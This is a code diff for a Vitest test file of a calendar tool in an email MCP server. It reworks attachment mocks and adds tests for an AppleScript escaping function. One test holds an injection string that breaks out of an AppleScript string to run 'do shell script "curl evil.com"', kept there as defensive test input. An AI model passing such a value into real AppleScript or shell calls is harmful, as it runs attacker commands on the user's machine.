@@ -1,14 +1,24 @@
 import { describe, it, expect, vi, beforeEach } from "vitest";
 import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
 import { HimalayaClient } from "../src/himalaya/client.js";
-import { parseICS } from "../src/adapters/calendar.js";
+import { parseICS, escapeAppleScript } from "../src/adapters/calendar.js";
 import { registerCalendarTools } from "../src/tools/calendar.js";
 
-// Mock node modules — simulate downloaded files in temp dir
+// Mock downloadAndList from attachments module (calendar.ts now delegates to it)
+const mockDownloadAndList = vi.fn().mockResolvedValue({
+  destDir: "/tmp/himalaya-mcp-cal-uuid-5678",
+  files: [
+    { filename: "invite.ics", mime: "text/calendar", size: 512 },
+    { filename: "notes.txt", mime: "text/plain", size: 100 },
+  ],
+});
+
+vi.mock("../src/tools/attachments.js", () => ({
+  downloadAndList: (...args: unknown[]) => mockDownloadAndList(...args),
+}));
+
+// Mock readFile for parseICSFile (reads .ics content from disk)
 vi.mock("node:fs/promises", () => ({
-  mkdir: vi.fn().mockResolvedValue(undefined),
-  // Default: dir contains invite.ics and notes.txt
-  readdir: vi.fn().mockResolvedValue(["invite.ics", "notes.txt", "plain.txt"]),
   readFile: vi.fn().mockResolvedValue(`BEGIN:VCALENDAR
 BEGIN:VEVENT
 SUMMARY:Team Standup
@@ -20,14 +30,6 @@ DESCRIPTION:Daily standup meeting
 UID:abc-123@example.com
 END:VEVENT
 END:VCALENDAR`),
-}));
-
-vi.mock("node:os", () => ({
-  tmpdir: vi.fn().mockReturnValue("/tmp"),
-}));
-
-vi.mock("node:crypto", () => ({
-  randomUUID: vi.fn().mockReturnValue("cal-uuid-5678"),
 }));
 
 // Mock osascript for create_calendar_event
@@ -146,6 +148,37 @@ END:VCALENDAR`;
 
 // --- Calendar Tool Tests ---
 
+
+describe("escapeAppleScript", () => {
+  it("escapes double quotes", () => {
+    expect(escapeAppleScript('Hello "world"')).toBe('Hello \\"world\\"');
+  });
+
+  it("escapes backslashes", () => {
+    expect(escapeAppleScript("path\\to\\file")).toBe("path\\\\to\\\\file");
+  });
+
+  it("strips newlines and tabs", () => {
+    expect(escapeAppleScript("line1\nline2\ttab")).toBe("line1 line2 tab");
+  });
+
+  it("strips carriage returns", () => {
+    expect(escapeAppleScript("hello\r\nworld")).toBe("hello  world");
+  });
+
+  it("strips non-printable ASCII", () => {
+    expect(escapeAppleScript("hello\x00\x01\x1Fworld")).toBe("helloworld");
+  });
+
+  it("blocks AppleScript injection attempts", () => {
+    const malicious = 'Meeting" & (do shell script "curl evil.com") & "';
+    const escaped = escapeAppleScript(malicious);
+    // All double quotes must be escaped, preventing string breakout
+    expect(escaped).not.toMatch(/(?<!\\)"/);
+    expect(escaped).toContain('\\"');
+  });
+});
+
 describe("Calendar tools", () => {
   let server: McpServer;
   let client: HimalayaClient;
@@ -169,9 +202,13 @@ describe("Calendar tools", () => {
     });
 
     it("returns message when no ICS found", async () => {
-      const { readdir } = await import("node:fs/promises");
-      // No .ics file in the downloaded files
-      vi.mocked(readdir).mockResolvedValueOnce(["notes.txt", "plain.txt"] as any);
+      // No .ics file among attachments
+      mockDownloadAndList.mockResolvedValueOnce({
+        destDir: "/tmp/himalaya-mcp-cal-uuid-5678",
+        files: [
+          { filename: "notes.txt", mime: "text/plain", size: 100 },
+        ],
+      });
       const tool = getToolHandler(server, "extract_calendar_event");
       const result = await tool.handler({ id: "55", folder: undefined, account: undefined }, {} as any);
 
@@ -179,7 +216,7 @@ describe("Calendar tools", () => {
     });
 
     it("handles errors", async () => {
-      vi.spyOn(client, "downloadAttachments").mockRejectedValue(new Error("not found"));
+      mockDownloadAndList.mockRejectedValueOnce(new Error("not found"));
       const tool = getToolHandler(server, "extract_calendar_event");
       const result = await tool.handler({ id: "999", folder: undefined, account: undefined }, {} as any);
 
